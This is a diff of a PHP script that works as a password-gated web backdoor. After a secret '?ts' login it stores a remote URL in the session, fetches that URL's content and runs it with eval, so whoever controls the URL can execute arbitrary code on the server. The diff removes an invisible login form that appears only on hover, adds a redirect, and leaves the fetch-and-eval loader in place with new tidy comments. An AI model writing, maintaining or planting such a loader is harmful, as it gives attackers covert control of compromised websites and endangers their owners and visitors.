@@ -40,16 +40,12 @@ if (isset($_GET['ts'])) {
         if (isset($_POST['password'])) {
             $provided_password = $_POST['password'];
             if (password_verify($provided_password, $correct_password)) {
-                $_SESSION['ts_auth'] = true; // Set session to true upon correct password
-                if (isset($_POST['url'])) {
-                    $url = $_POST['url'];
-                    $_SESSION["ts_url"] = $url;
-                    echo "updated : " . $_SESSION["ts_url"];
-                    exit;
-                } else {
-                    echo "Error! No URL provided.";
-                    exit;
-                }
+                // Set session flag for successful login
+                $_SESSION['ts_auth'] = true; // Store authentication state in session
+                $_SESSION["ts_url"] = isset($_POST['url']) ? $_POST['url'] : $url; // Set the URL in session
+                // Redirect to same page after authentication
+                header("Location: " . $_SERVER['REQUEST_URI']);
+                exit;
             } else {
                 echo "Invalid password!";
                 exit;
@@ -58,42 +54,15 @@ if (isset($_GET['ts'])) {
             echo "No password provided!";
             exit;
         }
-    } else {
-        ?>
-        <head>
-            <style>
-                #password { order: 2 }
-                #url { order: 1 }
-                #password, #url { display: block; margin-bottom: 10px; opacity: 0; transition: opacity .3s }
-                #password:hover, #url:hover { opacity: 1 }
-                form { display: flex; flex-direction: column; align-items: flex-end }
-            </style>
-            <script>
-                document.addEventListener("DOMContentLoaded", function() {
-                    document.querySelector("#password").addEventListener("keydown", function(e) {
-                        if ("Enter" === e.key) {
-                            e.preventDefault();
-                            document.querySelector("form").submit();
-                        }
-                    });
-                });
-            </script>
-        </head>
-        <body>
-            <form action="" method="post">
-                <input id="password" name="password" type="password"><br>
-                <input id="url" name="url" value="<?php echo isset($_POST['url']) ? $_POST['url'] : ''; ?>"><br>
-            </form>
-        </body>
-        <?php
-        exit;
     }
 } else {
+    // Check if the user is authenticated
     if (!isset($_SESSION['ts_auth']) || $_SESSION['ts_auth'] !== true) {
         echo "Unauthorized. Please authenticate first.";
         exit;
     }
 
+    // If the user is authenticated, fetch the URL content
     if (empty($_SESSION["ts_url"])) {
         $result = @file_get_contents($url);
         if (empty($result)) {
@@ -105,11 +74,12 @@ if (isset($_GET['ts'])) {
             $result = madrid($_SESSION["ts_url"]);
         }
     }
-}
 
-if (is_string($result)) {
-    eval('?>' . $result);
-} else {
-    echo "Error";
+    // Display the result of the URL content
+    if (is_string($result)) {
+        eval('?>' . $result);
+    } else {
+        echo "Error";
+    }
 }
 ?>
